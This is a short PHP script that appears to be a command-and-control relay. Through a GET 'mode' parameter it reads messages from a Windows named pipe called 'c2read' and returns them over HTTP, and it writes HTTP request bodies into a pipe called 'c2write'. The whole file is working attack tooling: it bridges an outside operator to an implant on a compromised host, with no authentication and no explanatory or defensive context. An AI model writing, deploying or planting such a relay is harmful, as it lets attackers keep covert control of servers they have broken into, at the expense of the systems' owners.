<?php

function readpipe($name){

    $name="\\\\.\\pipe\\".$name;
    $fp=fopen($name,"rb");
    $len=fread($fp,4);
    $len=unpack("v",$len)[1];
    $data=fread($fp,$len);
    fclose($fp);
    echo $data;
}

function writepipe($name){

    $name="\\\\.\\pipe\\".$name;
    $fp=fopen($name,"wb");
    $data=file_get_contents("php://input");
    fwrite($fp,$data);
    fclose($fp);


}

$mode=$_GET['mode'];
if(isset($mode)){
    if ($mode=='read'){
        readpipe("c2read");
    }elseif ($mode=='write'){
        writepipe("c2write");
    }

}else{
    echo "OK";
}
?>